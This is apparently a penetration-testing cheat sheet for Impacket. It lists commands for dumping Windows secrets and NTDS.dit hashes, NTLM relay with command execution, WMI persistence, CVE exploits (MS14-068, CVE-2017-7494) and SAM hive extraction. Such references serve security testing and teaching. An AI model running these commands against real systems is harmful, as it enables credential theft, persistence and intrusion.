# impacket

## General <a href="#general" id="general"></a>

```
# Almost every Impacket scripts follows the same option syntax

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it
```

## Windows Secrets <a href="#windows-secrets" id="windows-secrets"></a>

```bash
# Performs various techniques to dump secrets from the remote machine without 
# executing any agent there. 

# For SAM and LSA Secrets (including cached creds) 
# we try to read as much as we can from the registry and then we save the hives 
# in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data 
# from there. 

# For DIT files, we dump NTLM hashes, Plaintext credentials (if available)
# and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit 
# via vssadmin executed with the smbexec/wmiexec approach. The script initiates the 
# services required for its working if they are not available (e.g. 
# Remote Registry, even if it is disabled). 

# After the work is done, things are restored to the original state.

# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Remote extraction
secretsdump.py -just-dc-ntlm domain/user:password@IP
secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH
```

```bash
# Mini shell to control a remote mimikatz RPC server
mimikatz.py domain/user:password@IP
mimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:passwor
```

## Server Tools / MiTM Attacks <a href="#server-tools-mitm-attacks" id="server-tools-mitm-attacks"></a>

```bash
# This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying
# credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.)
# By default, it dumps the SAM database
responder.py -I eth0 -r -d -w
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c "ipconfig"


# A SMB Server that answers specific file contents regardless of the SMB share and pathname specified
karmaSMB.py filenamePathname
karmaSMB.py filenamePathname -smb2support

# A Python implementation of an SMB server. Allows to quickly set up shares and user accounts
smbserver.py SHARENAME /path/to/your/local/share
smbserver.py SHARENAME /path/to/your/local/share --username user --password password
```

## WMI <a href="#wmi" id="wmi"></a>

```bash
# It allows to issue WQL queries and get description of WMI objects at 
# the target system (e.g. select name from win32_account).
wmiquery.py domain/user:password@IP
# It will open a shell where you can execute WQL queries
SELECT * FROM Win32_LogicalDisk WHERE FreeSpace < 209152

# This script creates/removes a WMI Event Consumer/Filter and link between
# both to execute Visual Basic based on the WQL filter or timer specified.
wmipersist.py domain/user:password@IP install
wmipersist.py domain/user:password@IP remove
```

## Known vulnerabilities <a href="#known-vulnerabilities" id="known-vulnerabilities"></a>

```bash
# Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.
goldenPac.py domain/user:password@IP
goldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will exploit CVE-2017-7494, uploading and executing the shared
# library specified by the user through the -so parameter.
sambaPipe.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password -so SoFilenamepython

# Exploit for CVE-2015-0005 using a SMB Relay Attack. 
# If the target system is enforcing signing and a machine account was 
# provided, the module will try to gather the SMB session key through NETLOGON.
# Command will be executed on victimX for the specified target
smbrelayx.py -h victimIP -c cmdToExecute
smbrelayx.py -h victimIP -e payload.exe
```

## SMB/MSRPC <a href="#smb-msrpc" id="smb-msrpc"></a>

```bash
# A generic SMB client that will let you list shares and files, rename,
# upload and download files and create and delete directories
smbclient.py domain/user:password@IP
smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will connect against a target (or list of targets) machine/s and gather 
# the OS architecture type installed by (ab)using a documented MSRPC feature.
getArch.py -target 10.10.2.2

# This script will dump the list of RPC endpoints and string bindings registered at the 
# target. It will also try to match them with a list of well known endpoints.
rpcdump.py domain/user:password@IP
rpcdump.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will bind to the target's MGMT interface to get a list of interface IDs.
ifmap.py 10.10.20.1 135
ifmap.py 10.10.20.1 49154

# This binds to the given hostname:port and MSRPC interface.
# Then, it tries to call each of the first 256 operation numbers in turn
# and reports the outcome of each call
# Need to get interfaces, for example with ifmap.py
# usage: opdump.py hostname port interface version
opdump.py 10.10.1.1 135 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0

# An application that communicates with the Security Account Manager Remote interface
# from the MSRPC suite. It lists system user accounts, available resource shares 
# and other sensitive information exported through this service.
./samrdump.py SERVER/Administrator:T00r@192.168.1.140

# This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC 
# Interface. It supports start, stop, delete, status, config, list, create and change.
services.py SERVER/Administrator:T00r@192.168.1.140 {start,stop,delete,status,config,list,create,change}

# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2
netview.py domain/user:password -target 192.168.10.2 -user Administrator

# Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.
# The idea is to provide similar functionality as the REG.EXE Windows utility.
reg.py domain/user:password@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface
# aiming at finding remote users/groups.
lookupsid.py domain/user:password@IP
lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password
```

## MSSQL/TDS <a href="#mssql-tds" id="mssql-tds"></a>

```bash
# Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.
mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x
```

## File Formats <a href="#file-formats" id="file-formats"></a>

```bash
# An Extensibe Storage Engine format implementation. Allows dumping catalog, 
# pages and tables of ESE databases (e.g. NTDS.dit)
esentutl.py databaseFile {dump,info,export}

# NTFS format implementation. This script provides a mini shell for 
# browsing and extracting an NTFS volume, including hidden/locked contents.
ntfs-read.py /dev/disk1
ntfs-read.py "\C:"
ntfs-read.py "\C:" -extract "\windows\system32\config\sam"

# A Windwows Registry file format implementation. It allows to parse offline registry hives.
registry-read.py registryHive enum_key,enum_values,get_value,get_class,walk}
```

## Others <a href="#others" id="others"></a>

```bash
# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP

# Simple MQTT example aimed at playing with different login options.
mqtt_check.py domain/user:password@IP
mqtt_check.py domain/user:password@IP -ssl

# [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth.
# This example test whether an account is valid on the target host.
rdp_check.py domain/user:password@IP
rdp_check.py domain/user@IP -hashes LMHASH:NTHASH

# Simple packet sniffer that uses a raw socket to listen for packets 
# in transit corresponding to the specified protocols.
sniffer.py {tcp, udp, icmp}

# Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping.py <src-ip> <dst-ip>

# Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping6.py <src-ip> <dst-ip>
```
